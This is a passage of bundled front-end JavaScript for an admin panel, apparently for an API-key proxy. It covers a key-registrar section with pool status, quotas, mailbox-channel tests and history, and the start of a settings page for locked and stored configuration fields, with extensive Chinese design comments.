`));\n  const value = el(\"span\");\n  p.appendChild(value);\n  return { p, value };\n}\n\nfunction block(titleKey) {\n  const wrap = el(\"div\", { class: \"card block\" });\n  wrap.appendChild(elI18n(\"h3\", titleKey));\n  const body = el(\"div\");\n  wrap.appendChild(body);\n  return { wrap, body };\n}\n\nfunction tile(labelKey, tipKey) {\n  const card = el(\"div\", { class: \"card\" });\n  const label = elI18n(\"div\", labelKey, { class: \"label\" });\n  // tooltip 只挂在需要解释口径的那一格上（「占名额」）。**不是每格都挂**——\n  // 一个到处都是问号的面板等于没有问号。\n  if (tipKey) label.setAttribute(\"title\", t(tipKey));\n  card.appendChild(label);\n  const value = el(\"div\", { class: \"value\" });\n  card.appendChild(value);\n  return { card, value };\n}\n\n/**\n * 一张通道卡。**两条通道走同一条代码路径**，见文件头那段。\n *\n * 卡里恰好五行 + 一颗按钮：名称、角色、凭据、地址事实、测试结果行 + 「测试连接」。\n * **地址事实那一行是两条通道之间唯一的不对称**（设计 §10.3 第 5 条），\n * 而它是**同一个字段位置上的两句不同事实**，不是「一边有一边没有」——\n * 后者才会被读成排名。\n */\nfunction buildChannelCard(channel) {\n  const card = el(\"div\", { class: \"card channel-card\", \"data-channel\": channel });\n  card.appendChild(elI18n(\"div\", channelLabelKey(channel), { class: \"label channel-name\" }));\n\n  const role = row(\"reg.channel.role\");\n  const creds = row(\"reg.channel.creds\");\n  card.appendChild(role.p);\n  card.appendChild(creds.p);\n\n  // 地址事实：常驻文案，不随响应变化（它讲的是这两家服务本身的性质）。\n  card.appendChild(elI18n(\"p\", channelAddressFactKey(channel), { class: \"muted note\" }));\n\n  const test = elI18n(\"button\", \"reg.channel.test\", { type: \"button\", class: \"channel-test\" });\n  card.appendChild(test);\n\n  const result = el(\"p\", { class: \"muted note channel-result\" });\n  card.appendChild(result);\n\n  test.addEventListener(\"click\", () => { runChannelTest(channel, test, result); });\n  return { card, role: role.value, creds: creds.value, test, result };\n}\n\n/**\n * 跑一次通道连通性测试。\n *\n * **在飞期间禁用这颗按钮**：它每点一次就向邮箱服务发一次真实请求。\n *\n * ⚠️ **这段话订正过（P3d Task 8）**：上一版写着「这条端点**后端没有冷却也没有预算闸**」\n * ——**那句话已经不成立了**。后端现在有一套出站探测护栏（在途去重 + 最小间隔，\n * 与单把 key 验活共用同一份，见 `src/http/admin/probe-guard.ts`），\n * 同一条通道在最小间隔内的第二次点击会拿到 **429**，顶层 `reason` 是\n * `probe_in_flight` / `probe_cooldown`，两条都在 `refuseReasonKey()` 的表里。\n *\n * **前端这一行仍然要留着，但理由不是「两者不重叠」——那句话是假的**（定向复评 NEW-9）：\n * 手滑连点时**护栏同样挡得住**（后端回 429，第二次不会真打上游），\n * 两者在「第二次不会真打上游」这个**结果**上完全重叠，差别只在 **UX**：\n * 有这一行，运维看到的是一颗变灰的按钮；没有这一行，他手一抖就会拿到一句\n * 「请稍后再试」，而他什么错都没犯。\n *\n * ⇒ 准确的说法是**各自还挡住了对方挡不住的那一半**：\n * 护栏挡得住脚本（前端禁用挡不住），前端禁用挡得住那句无谓的 429 文案（护栏挡不住）。\n * **两者都不是「连点已经解决了」**——护栏是进程/isolate 内的，跨副本无效。\n */\nasync function runChannelTest(channel, button, resultNode) {\n  button.disabled = true;\n  resultNode.textContent = t(\"reg.channel.testing\");\n  try {\n    const res = await api.post(`/registrar/channels/${channel}/test`);\n    const view = channelTestResult(res);\n    resultNode.textContent = t(view.key, view.params);\n  } catch (e) {\n    // 后端明确拒绝（注册机没开 / 这条通道没配 / 没接线）时有顶层 `reason`，\n    // 拿它选一句确切的话；拿不到就退回一句通用的，**不猜**。\n    const key = refuseKeyOf(e && e.body);\n    resultNode.textContent = key === null ? t(\"reg.channel.testError\") : t(key);\n  } finally {\n    button.disabled = false;\n  }\n}\n\n/**\n * 算「本次最多铸几把」要的那份状态。\n *\n * 本板块已经拉过就直接用（切板块回来时那份数据就是刚拉的）；**Key 池板块那条\n * 入口进来时它是 `null`**，此时现拉一次——一次点击付一次读，比让确认弹窗\n * 显示一个 `—` 好，而「明示消耗」是设计 §10.2 写死的第 3 条护栏。\n * 拉失败就回 `null`，弹窗会如实说「说不准」而不是编一个数字。\n */\nasync function statusForCost() {\n  if (data !== null) return data;\n  try {\n    return await api.get(\"/registrar/status\");\n  } catch (e) {\n    return null;\n  }\n}\n\n/**\n * 「立即补池」的确认弹窗（设计 §10.2 第 3 条护栏：必须明示消耗）。\n *\n * **两个入口共用这一个函数**：本板块工具条上那颗按钮（`channel === null`，\n * 弹窗里带通道下拉），与 Key 池板块「添加 Key」菜单里【自动注册】那两项\n *（`channel` 已经定死，弹窗里显示的是「用哪条通道」的**结果**而不是一个下拉）。\n * 抄成两份的话，「明示消耗」这条护栏迟早只剩一半——而少的那一半正好是\n * 点击频率更高的那个入口。\n *\n * ⚠️ **通道下拉初始是占位符，两条通道都不预选**——与设计 §10.3 第 1 条\n *（主通道下拉无默认选中值）是同一条纪律：预选任何一条都会被读成排名。\n * 占位符本身是一个**有意义的选项**（「按当前配置的主/备通道」），不是空白项。\n *\n * ⚠️⚠️ **这不是设计 §10.4 设置页里那个「主通道」下拉。** 那一条（连同第 7 条\n * `fallback !== primary` 的即时拦截）属于 config 写路径，而本任务没有那条端点\n * ——**别把这里这一格当成第 1 条与第 7 条已经落地了**。\n */\nexport async function confirmAndTend(channel) {\n  const body = el(\"div\");\n  const cost = tendCost(await statusForCost());\n  body.appendChild(el(\n    \"p\", null,\n    cost === null\n      ? t(\"reg.tend.confirmUnknown\")\n      : t(\"reg.tend.confirmMsg\", { keys: fmtCount(cost.keys), mailboxes: fmtCount(cost.mailboxes) }),\n  ));\n\n  const label = el(\"label\");\n  label.appendChild(elI18n(\"span\", \"reg.tend.channelLabel\"));\n  let read = () => channel;\n  if (channel === null) {\n    const select = el(\"select\", { class: \"tend-channel\" });\n    select.appendChild(el(\"option\", { value: \"\" }, t(\"reg.tend.channelAny\")));\n    for (const c of CHANNELS) {\n      select.appendChild(el(\"option\", { value: c }, t(channelLabelKey(c))));\n    }\n    // **显式写死初始值**，不靠「第一个 option 恰好是占位符」这个巧合：\n    // 有人往前面插一条通道时，那个巧合会静默地把它变成预选项。\n    select.value = \"\";\n    label.appendChild(select);\n    read = () => (select.value === \"\" ? null : select.value);\n  } else {\n    label.appendChild(el(\"span\", null, t(channelLabelKey(channel))));\n  }\n  body.appendChild(label);\n\n  openModal(\"reg.tend.confirmTitle\", body, [\n    { labelKey: \"common.cancel\" },\n    { labelKey: \"common.confirm\", onClick: () => { startTend(read()); } },\n  ]);\n}\n\nasync function startTend(channel) {\n  try {\n    await api.post(\"/registrar/tend\", channel === null ? {} : { channel });\n    toast(t(\"reg.tend.started\"), \"ok\");\n  } catch (e) {\n    const key = refuseKeyOf(e && e.body);\n    // 拒绝的原因**必须留在屏幕上**（sticky）：它们里面有「今天的额度用完了」\n    // 这种四秒钟根本读不完、而且读漏了会让人反复点的信息。\n    toast(key === null ? t(\"reg.tend.failed\") : t(key), \"warn\", { sticky: true });\n  }\n  // 无论成败都重新拉一次：成功那一支的 `remaining` 与冷却时刻都变了，\n  // 失败那一支也可能是因为别的副本刚抢走了锁。\n  // **Key 池板块那条入口进来时本板块可能还没 init 过**（`nodes === null`），\n  // `load()` 自己会跳过渲染，见那里。\n  load();\n}\n\nfunction renderStatus() {\n  const s = statusView(data);\n  nodes.state.textContent = s.enabled === null ? fmtDash(null) : t(s.enabled ? \"reg.state.on\" : \"reg.state.off\");\n  nodes.primary.textContent = s.primary === null ? t(\"reg.none\") : s.primary;\n  nodes.fallback.textContent = s.fallback === null ? t(\"reg.none\") : s.fallback;\n\n  // 设计 §10.3 第 8 条的空状态：**只在注册机开着却没有主通道时出现**。\n  // 注册机整个关着时不显示它——那时该说的是「已关闭」，而不是催人去选通道。\n  nodes.emptyPrimary.style.display = s.enabled === true && s.primary === null ? \"\" : \"none\";\n\n  nodes.locked.textContent = s.lockedUntil === null\n    ? \"\" : t(\"reg.locked\", { at: fmtInstant(s.lockedUntil, offsetMs()) });\n  nodes.locked.style.display = s.lockedUntil === null ? \"none\" : \"\";\n}\n\nfunction renderPool() {\n  const p = poolView(data);\n  nodes.pool.target.textContent = fmtCount(p.target);\n  nodes.pool.counted.textContent = fmtCount(p.counted);\n  nodes.pool.gap.textContent = fmtCount(p.gap);\n  nodes.pool.fresh.textContent = fmtCount(p.fresh);\n}\n\n/**\n * 「今天还剩几次 / 什么时候能再点」。\n *\n * ⚠️ **`remaining` 在点之前就显示**，不是等到点不动了才说——只在耗尽那一支说，\n * 等于让运维毫不知情地撞上一堵墙（后端 202 那一支也给 `remaining` 正是为了这个）。\n * ⚠️ **倒计时用相对量 `retryAfterMs`、几点恢复用绝对量 `cooldownUntil`**，\n * 两个都由服务端给，绝不拿本地时钟去减服务端时刻。\n */\nfunction renderQuota() {\n  const q = manualQuotaView(data);\n  if (q.remaining === null || q.perDay === null) {\n    nodes.quota.textContent = fmtDash(null);\n  } else {\n    nodes.quota.textContent = t(\"reg.tend.quota\", { remaining: fmtCount(q.remaining), perDay: fmtCount(q.perDay) })\n      + (q.resetAt === null ? \"\" : t(\"reg.tend.quotaReset\", { at: fmtInstant(q.resetAt, offsetMs()) }));\n  }\n  const cooling = q.cooldownUntil !== null && q.retryAfterMs !== null;\n  nodes.cooldown.textContent = cooling\n    ? t(\"reg.tend.cooldown\", {\n      at: fmtInstant(q.cooldownUntil, offsetMs()),\n      left: fmtDuration(q.retryAfterMs),\n    })\n    : \"\";\n  nodes.cooldown.style.display = cooling ? \"\" : \"none\";\n}\n\nfunction renderChannels() {\n  for (const card of channelCards(data)) {\n    const n = nodes.channels[card.channel];\n    n.role.textContent = card.role === null && card.configured === null\n      ? fmtDash(null) : t(channelRoleKey(card.role));\n    n.creds.textContent = card.configured === null\n      ? fmtDash(null) : t(card.configured ? \"reg.channel.credsYes\" : \"reg.channel.credsNo\");\n  }\n}\n\n/** 一条失败归因的徽章。**表外的 reason 原样显示出来**，不冒充任何一档已知归因。 */\nfunction failureBadge(f) {\n  const text = f.key === null ? t(\"reg.fail.unknownReason\", { reason: f.reason }) : t(f.key);\n  return el(\"span\", { class: \"badge badge-warn\" }, f.channel === \"\" ? text : `${f.channel} · ${text}`);\n}\n\nfunction renderHistory() {\n  const rows = historyRows(data);\n  const malformed = historyMalformed(data);\n  nodes.malformed.textContent = malformed === null || malformed === 0\n    ? \"\" : t(\"reg.history.malformed\", { count: fmtCount(malformed) });\n  nodes.malformed.style.display = malformed === null || malformed === 0 ? \"none\" : \"\";\n\n  nodes.historyBody.textContent = \"\";\n  if (rows.length === 0) {\n    nodes.historyBody.appendChild(elI18n(\"p\", \"reg.history.empty\", { class: \"muted\" }));\n    return;\n  }\n\n  const table = el(\"table\");\n  const head = el(\"tr\");\n  for (const k of [\"reg.col.at\", \"reg.col.trigger\", \"reg.col.channel\", \"reg.col.result\", \"reg.col.duration\", \"reg.col.failures\"]) {\n    head.appendChild(elI18n(\"th\", k));\n  }\n  table.appendChild(head);\n\n  for (const r of rows) {\n    const tr = el(\"tr\");\n    tr.appendChild(el(\"td\", null, typeof r.at === \"number\" ? fmtInstant(r.at, offsetMs()) : fmtDash(null)));\n    tr.appendChild(el(\n      \"td\", null,\n      r.trigger === \"manual\" ? t(\"reg.trigger.manual\") : (r.trigger === \"cron\" ? t(\"reg.trigger.cron\") : fmtDash(null)),\n    ));\n    // `primaryChannel` 是**这一轮实际用的那条**（手动补池可以指定单条通道），\n    // 不是配置里的主通道。空串 = 注册机当时关着。\n    tr.appendChild(el(\"td\", null, typeof r.primaryChannel === \"string\" && r.primaryChannel !== \"\"\n      ? r.primaryChannel : fmtDash(null)));\n\n    const outcome = roundOutcome(r);\n    const resultCell = el(\"td\");\n    resultCell.appendChild(el(\"div\", null, t(outcome.key, outcome.params)));\n    const byChannel = mintedByChannelText(r);\n    if (byChannel !== null) {\n      resultCell.appendChild(el(\"div\", { class: \"muted\" }, t(\"reg.row.byChannel\", { detail: byChannel })));\n    }\n    tr.appendChild(resultCell);\n\n    tr.appendChild(el(\"td\", null, typeof r.durationMs === \"number\" ? fmtDuration(r.durationMs) : fmtDash(null)));\n\n    const failCell = el(\"td\");\n    const failures = roundFailures(r);\n    if (failures.length === 0) failCell.textContent = fmtDash(null);\n    else for (const f of failures) failCell.appendChild(failureBadge(f));\n    tr.appendChild(failCell);\n\n    table.appendChild(tr);\n  }\n  nodes.historyBody.appendChild(table);\n}\n\nfunction render() {\n  renderStatus();\n  renderPool();\n  renderQuota();\n  renderChannels();\n  renderHistory();\n}\n\nasync function load() {\n  if (abort) abort.abort();\n  abort = new AbortController();\n  try {\n    data = await api.get(\"/registrar/status\", { signal: abort.signal });\n  } catch (e) {\n    if (e && e.name === \"AbortError\") return;\n    // **不伪造上一次的数据**：读失败就清空，不留着旧值假装它是新的。\n    data = null;\n  }\n  // ⚠️ **`nodes === null` 说明本板块还没被打开过**（Key 池板块的【自动注册】\n  // 那两项会在没打开过注册机板块的情况下走到这条路上）。此时**只更新 `data`、\n  // 不渲染**——渲染一棵还不存在的子树只会抛 TypeError，而那次抛错发生在\n  // `startTend` 的 `await` 之后，连 toast 都已经弹过了，运维只会在控制台看到它。\n  if (nodes !== null) render();\n}\n\nexport const registrarSection = {\n  init(section) {\n    section.textContent = \"\";\n    section.appendChild(elI18n(\"h2\", \"reg.title\"));\n\n    const bar = el(\"div\", { class: \"toolbar\" });\n    const refresh = elI18n(\"button\", \"common.refresh\", { type: \"button\" });\n    refresh.addEventListener(\"click\", () => { load(); });\n    bar.appendChild(refresh);\n    const tend = elI18n(\"button\", \"reg.tend.button\", { type: \"button\", class: \"tend-now\" });\n    tend.addEventListener(\"click\", () => { confirmAndTend(null); });\n    bar.appendChild(tend);\n    section.appendChild(bar);\n\n    const status = block(\"reg.state\");\n    const state = row(\"reg.state\");\n    const primary = row(\"reg.primary\");\n    const fallback = row(\"reg.fallback\");\n    for (const r of [state, primary, fallback]) status.body.appendChild(r.p);\n    const emptyPrimary = elI18n(\"p\", \"reg.emptyPrimary\", { class: \"muted note\" });\n    emptyPrimary.style.display = \"none\";\n    status.body.appendChild(emptyPrimary);\n    const quota = el(\"p\", { class: \"muted note\" });\n    const cooldown = el(\"p\", { class: \"muted note\" });\n    cooldown.style.display = \"none\";\n    const locked = el(\"p\", { class: \"muted note\" });\n    locked.style.display = \"none\";\n    status.body.appendChild(quota);\n    status.body.appendChild(cooldown);\n    status.body.appendChild(locked);\n    section.appendChild(status.wrap);\n\n    const poolRow = el(\"div\", { class: \"card-row\" });\n    const target = tile(\"reg.pool.target\");\n    const counted = tile(\"reg.pool.counted\", \"reg.pool.countedTip\");\n    const gap = tile(\"reg.pool.gap\");\n    const fresh = tile(\"reg.pool.fresh\");\n    for (const c of [target, counted, gap, fresh]) poolRow.appendChild(c.card);\n    section.appendChild(poolRow);\n\n    const channelsBlock = block(\"reg.channels.title\");\n    channelsBlock.body.appendChild(elI18n(\"p\", \"reg.channel.testHint\", { class: \"muted note\" }));\n    const channelRow = el(\"div\", { class: \"card-row\" });\n    const channels = {};\n    // **顺序取自 `CHANNELS`**（字母序），不取响应里对象键的顺序——后者改后端一行\n    // 就能悄悄改变面板上谁排在前面，而任何顺序都会被读成排名。\n    for (const channel of CHANNELS) {\n      const built = buildChannelCard(channel);\n      channels[channel] = built;\n      channelRow.appendChild(built.card);\n    }\n    channelsBlock.body.appendChild(channelRow);\n    section.appendChild(channelsBlock.wrap);\n\n    const historyBlock = block(\"reg.history.title\");\n    const malformed = el(\"p\", { class: \"muted note\" });\n    malformed.style.display = \"none\";\n    historyBlock.body.appendChild(malformed);\n    const historyBody = el(\"div\");\n    historyBlock.body.appendChild(historyBody);\n    section.appendChild(historyBlock.wrap);\n\n    nodes = {\n      state: state.value, primary: primary.value, fallback: fallback.value,\n      emptyPrimary, quota, cooldown, locked,\n      pool: { target: target.value, counted: counted.value, gap: gap.value, fresh: fresh.value },\n      channels, malformed, historyBody,\n    };\n  },\n\n  onShow() {\n    load();\n  },\n\n  onHide() {\n    // **作废在飞请求**：不作废的话切回来时旧响应可能盖掉新数据（板块契约 §9.3）。\n    if (abort) { abort.abort(); abort = null; }\n  },\n};\n", type: "text/javascript; charset=utf-8", etag: "\"70bc8fad6ab28248\"" },
  "/admin/js/sec-settings.js": { body: "/**\n * 设置页（设计 §10.4 的前三张卡）：认证密钥 / 上游与冷却 / 注册机。\n *\n * 板块契约（设计文档 §9.3）：`{ init?, onShow?, onHide? }`，见 admin-ui/js/app.js\n * 的 showSection。**板块内不许监听 langchange**——框架层会 apply(document) 之后\n * 重跑一次 onShow()。\n *\n * ── 四条纪律 ────────────────────────────────────────────────────────────────\n *\n * ① **一切来自接口的内容一律 textContent**（四元组里的 `stored` 可能是任何东西，\n *    包括被外部写坏的字符串）。\n * ② **取值决策一律不写在这里**，全在 `js/pure/settings.mjs` 里\n *    （admin-ui/README.md 硬规则 1）。\n * ③ ⚠️⚠️ **成功提示不得早于回读**（设计 §5.3：「本设计唯一一条不可妥协的产品原则」）。\n *    这条在本文件的落点是 `save()` 里那一行 `const res = await api.put(...)`——\n *    **任何「已保存」的迹象都必须排在它之后**。把提示挪到 `await` 之前，\n *    `tests/ui/dom/settings-save.test.ts` 的\n *    「回读还没落定之前，界面上不许出现任何成功迹象」会变红。\n *    **并且不弹「已保存并生效」**（设计 §5.3 明令），而是回读 `effective`\n *    并把变化的字段高亮。\n * ④ **没有自动刷新。** 这个板块每刷新一次要付 1 次存储读，而配额账把面板的读\n *    算成「人点一下才发生」。\n */\nimport { api } from \"./api.js\";\nimport { t } from \"./i18n.js\";\nimport { el, elI18n, toast, openModal, copy } from \"./ui.js\";\nimport { fmtDuration } from \"./pure/format.mjs\";\n// 第 4 张卡（集成示例）。**模型清单直接复用模型板块那份窄化**，不在 examples.mjs 里\n// 再写一遍——同一份响应的同一个字段，两份窄化就是两份会分叉的判据。\nimport { catalogModels } from \"./pure/models.mjs\";\nimport {\n  EXAMPLE_LANGS, KEY_PLACEHOLDER, exampleProtocols, allExamples, langLabel,\n} from \"./pure/examples.mjs\";\n// **顺序的唯一真源在 `registrar.mjs`**，本文件把它传给 `channelFields()`，\n// `settings.mjs` 里不重新声明一份（见那里的说明）。\nimport { CHANNELS, channelLabelKey, channelAddressFactKey } from \"./pure/registrar.mjs\";\nimport {\n  CARD_AUTH, CARD_UPSTREAM, CARD_REGISTRAR, ADVANCED_FIELDS,\n  channelFields, fieldLabelKey, fieldView, credentialView,\n  buildPatch, localErrors, changedFields, changedSecrets, propagationView,\n  errorRows, clearResultView, displayValue, clearWarning, isDiagnostic, loadBlockedRows,\n} from \"./pure/settings.mjs\";\n\nlet nodes = null;\nlet abort = null;\n/**\n * 运维**真的动过**的那些字段路径。\n *\n * ⚠️ **它只在「这一格没有基线可比」时才起作用**（诊断态下后端把 `fields` 整个给\n * `null`）。没有基线时「变没变」这个问题没有答案，而凭空替运维送一个值的后果\n * 是「面板做了他没要求的事，然后显示成功」——见 `buildPatch` 里那段 ⚠️⚠️。\n * 每次重新渲染都清空：渲染之后表单里的值就是服务端的当前状态，谈不上「动过」。\n */\nlet touched = new Set();\n/** 最近一次成功的 `GET /admin/api/config` 响应；`null` = 还没有过一次成功。 */\nlet data = null;\n\n// ───────────────────────────────────────────────────────────────────────────\n// 第 4 张卡：集成示例（P3d Task 7，设计 §10.4）的那几格状态\n// ───────────────────────────────────────────────────────────────────────────\n\n/**\n * 窄化之后的协议目录（`{ protocols, models }`）。`null` = 还没读到 / 读不出来。\n * **成功读到一次就不再读**：这份目录是静态的（`src/core/admin/protocol-catalog.ts`\n * 全部是模块级常量），重读一遍只会换来一次「这次可能失败」的机会。\n */\nlet exCatalog = null;\n/**\n * 这一刻有没有一条目录读在飞。\n *\n * ⚠️ **它不是可有可无的**：`onShow()` 是隐式入口，读还没回来时切走再切回来，\n * `exCatalog` 仍是 `null` ⇒ 没有这条早退就会发出第二条链，而**一条晚到的失败会把\n * 已经画好的示例卡抹掉**（`admin-ui/js/sec-models.js` 的文件头记着这个缺陷的实测过程，\n * 那里两条链并存的后果是 `rowsAfterLateFailure=0`）。\n */\nlet exInFlight = false;\n/** 当前选中的协议 id；空串 = 还没选过，渲染时落到真源给的第一条。 */\nlet exProto = \"\";\n/** 当前选中的语言。**默认取 `EXAMPLE_LANGS` 的第一档，不写第二份字面量。** */\nlet exLang = EXAMPLE_LANGS[0];\n/**\n * 示例里的 base URL。\n *\n * ⚠️⚠️ **它是运行期读来的，一个字面量都不许写死**（全局约束 4 / 11）：面板部署在哪个\n * 域名下，示例里的地址就该是哪个。**这一行必须留在板块文件里**——`js/pure/` 下禁止\n * 出现浏览器那两个顶层全局（`scripts/build-ui.mjs` 的三条静态校验，含注释里的字样），\n * 所以纯函数只收一个 `origin` 参数，读它是板块文件的活。\n */\nlet exOrigin = \"\";\n\n/**\n * 一格字段。**公开字段与凭据长得不一样，但都由这一个函数建出来**——\n * 两条代码路径迟早会分叉（一边有锁徽标、一边忘了加），而分叉的那一边正好是\n * 凭据这一边时，后果是运维在一个被 env 锁死的口令框里改了半天。\n */\nfunction buildField(path, secret) {\n  const wrap = el(\"div\", { class: \"cfg-field\", \"data-field\": path });\n  const label = elI18n(\"label\", fieldLabelKey(path), { class: \"cfg-label\" });\n  wrap.appendChild(label);\n\n  const input = secret\n    ? el(\"input\", { type: \"password\", autocomplete: \"new-password\", \"data-i18n-ph\": \"set.secretPlaceholder\" })\n    : el(\"input\", { type: \"text\" });\n  if (secret) input.setAttribute(\"placeholder\", t(\"set.secretPlaceholder\"));\n  wrap.appendChild(input);\n\n  // 四元组那三格（`stored` / `env` / `effective`）与锁定说明各自一行。\n  const meta = el(\"p\", { class: \"muted note cfg-meta\" });\n  wrap.appendChild(meta);\n  const lock = el(\"p\", { class: \"muted note cfg-lock\" });\n  lock.style.display = \"none\";\n  wrap.appendChild(lock);\n\n  let clear = null;\n  if (secret) {\n    clear = elI18n(\"button\", \"set.clearSecret\", { type: \"button\", class: \"cfg-clear danger\" });\n    clear.addEventListener(\"click\", () => { confirmClear(path); });\n    wrap.appendChild(clear);\n  }\n  return { wrap, input, meta, lock, clear, path, secret };\n}\n\n/** 主/备通道的下拉。**初始是占位符，两条通道都不预选**（设计 §10.3 第 1 条）。 */\nfunction buildChannelSelect(path) {\n  const wrap = el(\"div\", { class: \"cfg-field\", \"data-field\": path });\n  wrap.appendChild(elI18n(\"label\", fieldLabelKey(path), { class: \"cfg-label\" }));\n  const select = el(\"select\");\n  // 占位符本身是一个**有意义的选项**（「未选择」），不是空白项。\n  select.appendChild(el(\"option\", { value: \"\" }, t(\"reg.none\")));\n  for (const c of CHANNELS) {\n    select.appendChild(el(\"option\", { value: c }, t(channelLabelKey(c))));\n  }\n  // **显式写死初始值**，不靠「第一个 option 恰好是占位符」这个巧合。\n  select.value = \"\";\n  wrap.appendChild(select);\n  const meta = el(\"p\", { class: \"muted note cfg-meta\" });\n  wrap.appendChild(meta);\n  const lock = el(\"p\", { class: \"muted note cfg-lock\" });\n  lock.style.display = \"none\";\n  wrap.appendChild(lock);\n  return { wrap, input: select, meta, lock, clear: null, path, secret: false };\n}\n\n/** 注册机开关。布尔字段用 checkbox，别的都是文本框。 */\nfunction buildToggle(path) {\n  const wrap = el(\"div\", { class: \"cfg-field\", \"data-field\": path });\n  wrap.appendChild(elI18n(\"label\", fieldLabelKey(path), { class: \"cfg-label\" }));\n  const input = el(\"input\", { type: \"checkbox\" });\n  wrap.appendChild(input);\n  const meta = el(\"p\", { class: \"muted note cfg-meta\" });\n  wrap.appendChild(meta);\n  const lock = el(\"p\", { class: \"muted note cfg-lock\" });\n  lock.style.display = \"none\";\n  wrap.appendChild(lock);\n  return { wrap, input, meta, lock, clear: null, path, secret: false };\n}\n\nfunction card(titleKey) {\n  const wrap = el(\"div\", { class: \"card block\" });\n  wrap.appendChild(elI18n(\"h3\", titleKey));\n  const body = el(\"div\");\n  wrap.appendChild(body);\n  return { wrap, body };\n}\n\n/** 建一格并登记进 `nodes.fields`，两处都不许漏——漏了那一格永远不会被渲染。 */\nfunction addField(container, path, kind) {\n  const built = kind === \"select\"\n    ? buildChannelSelect(path)\n    : (kind === \"toggle\" ? buildToggle(path) : buildField(path, kind === \"secret\"));\n  container.appendChild(built.wrap);\n  nodes.fields[path] = built;\n  // **两种事件都收**：文本框走 `input`，下拉与开关走 `change`。\n  // 漏掉任一种，那一类控件在诊断态下就再也提交不上去（F1 的反面）。\n  for (const type of [\"input\", \"change\"]) {\n    built.input.addEventListener(type, () => { touched.add(path); });\n  }\n  return built;\n}\n\n// ───────────────────────────────────────────────────────────────────────────\n// 渲染\n// ───────────────────────────────────────────────────────────────────────────\n\nfunction renderOne(built) {\n  const path = built.path;\n  if (built.secret) {\n    const v = credentialView(data, path);\n    built.meta.textContent = v.present === false\n      ? t(\"set.meta.unreadable\")\n      : t(\"set.meta.secret\", {\n        state: t(v.configured === true ? \"set.secretSet\" : \"set.secretUnset\"),\n        hint: v.hint === null ? \"—\" : v.hint,\n      });\n    setLock(built, v.locked, v.lockedBy);\n    // **凭据框永远是空的**：它没有明文可回填（设计 §8.6），占位符说「留空则不修改」。\n    built.input.value = \"\";\n    // 锁定的凭据框不许可编辑（M11）。**由这里显式决定**，见 `setLock` 上面那段。\n    built.input.disabled = v.locked === true;\n    // ⚠️ **清空按钮不跟着 `locked` 一起禁用，这一行是订正。**\n    // 它清的是**存储里那一份**，而 env 锁定恰恰是「清掉存储那份最安全」的状态\n    //（生效值回落到环境变量，纹丝不动）。第一版跟着 `locked` 禁用，\n    // 与 `src/core/admin/config-validate.ts` 的 `clearSecret` 里写着的理由\n    //（「环境变量提供口令的部署想清掉存储里那份多余的旧口令时无路可走」）自相矛盾——\n    // 后端从来没拦过它，`configClearSecretHandler` 里那个 `stillConfigured` 分支\n    // 就是专门为这个状态写的，只有前端把它挡死了。\n    // 判据改成「有东西可清才让点」：`configured` 为假时清空是纯粹的空操作。\n    if (built.clear !== null) built.clear.disabled = v.configured !== true;\n    return;\n  }\n\n  const v = fieldView(data, path);\n  if (v.present === false) {\n    built.meta.textContent = t(\"set.meta.unreadable\");\n    // ⚠️⚠️ **诊断态下**（存储里那份配置装载不起来）**不许把输入框置灰**：\n    // 那会把「关掉注册机 / 把那把 key 填回去」这两条自救路径在 UI 上堵死，\n    // 而后端明明放行。只有「这一格单独没读到」才置灰——那时改它也没有意义。\n    //\n    // ⚠️ **史实订正（复评 F5）**：改动前这一行写的是 `disabled = true`，\n    // 但下面那句 `setLock(built, false, null)` 会把它抹回 `false`（那行已删，\n    // 见 `setLock` 上面那段）⇒ **诊断态从来没被置灰过**，真正没生效的是\n    // 「单独一格没读到」那一半。这一行是让两种状态**第一次分得开**，\n    // 不是在修一个「被置灰」的缺陷。\n    built.input.disabled = !isDiagnostic(data);\n    setLock(built, false, null);\n    return;\n  }\n  built.meta.textContent = t(\"set.meta.quad\", {\n    stored: displayValue(v.stored),\n    env: displayValue(v.env),\n    effective: displayValue(v.effective),\n  });\n  // 被 env 锁定的字段置灰（M11）。**由这里显式决定**，见 `setLock` 上面那段。\n  built.input.disabled = v.locked === true;\n  // 输入框里回填**存储层**那个值（面板真正在改的就是那一层）；存储里没有就留空，\n  // 生效值另在上面那一行里写着。\n  if (built.input.getAttribute(\"type\") === \"checkbox\") {\n    built.input.checked = v.stored === true || (v.stored === null && v.effective === true);\n  } else {\n    built.input.value = v.stored === null || v.stored === undefined ? \"\" : String(v.stored);\n    // **框里空着的时候，占位符显示当前生效值**：框里回填的是存储层那个值，而全新\n    // 部署下存储层是空的 ⇒ 一整页空框。占位符把「现在实际在用的是什么」放回框里，\n    // 而它**不是**一个会被提交的值（留空 = 这次不改这一格，见 `buildPatch`）。\n    built.input.setAttribute(\"placeholder\", displayValue(v.effective));\n  }\n  setLock(built, v.locked, v.lockedBy);\n}\n\n/**\n * 锁定字段：**输入框置灰 + 一句怎么轮换的说明**（设计 §5.3 UI 规则 / §10.4 卡 1）。\n *\n * ⚠️ **说明必须说清「怎么改」，不是只说「被锁了」**：环境变量锁定时，面板上改\n * 一百遍都不会生效，运维要知道去改的是部署那一侧。\n */\nfunction setLock(built, locked, lockedBy) {\n  // ⚠️⚠️ **这个函数不再碰 `disabled`，那一行是死代码，而且它杀过别人。**\n  //\n  // 原来这里写着 `built.input.disabled = locked === true;`，而它**紧跟在调用方\n  // 刚设好的 `disabled` 之后执行** ⇒ 把调用方的决定整个覆盖掉。后果具体：\n  // 「这一格没读到」那一支里的 `built.input.disabled = true` **从落地那天起就没\n  // 生效过**（`setLock(built, false, null)` 立刻把它抹回 `false`）。\n  // 这条是本任务补「诊断态下表单必须还能用」的对照用例时挖出来的——\n  // 一个**看起来在生效、实际从来没生效**的赋值。\n  // ⇒ `disabled` 由**调用方**显式决定（三处各有各的判据），这里只管锁的视觉与说明。\n  built.lock.style.display = locked === true ? \"\" : \"none\";\n  built.lock.textContent = locked === true\n    ? t(\"set.lockedBy\", { env: String(lockedBy || \"\").replace(/^env:/, \"\") })\n    : \"\";\n  built.wrap.classList.toggle(\"locked\", locked === true);\n}\n\nfunction render() {\n  // 渲染之后表单里的值就是服务端的当前状态，之前那些「动过」的痕迹全部作废。\n  touched = new Set();\n  for (const path of Object.keys(nodes.fields)) renderOne(nodes.fields[path]);\n\n  const p = propagationView(data);\n  nodes.propagation.textContent = p.visibilityUpperBoundMs === null\n    ? \"\"\n    : t(\"set.propagation\", { bound: fmtDuration(p.visibilityUpperBoundMs) });\n  nodes.propagation.style.display = p.visibilityUpperBoundMs === null ? \"none\" : \"\";\n\n  const degraded = data !== null && data.configDegraded === true;\n  nodes.degraded.style.display = 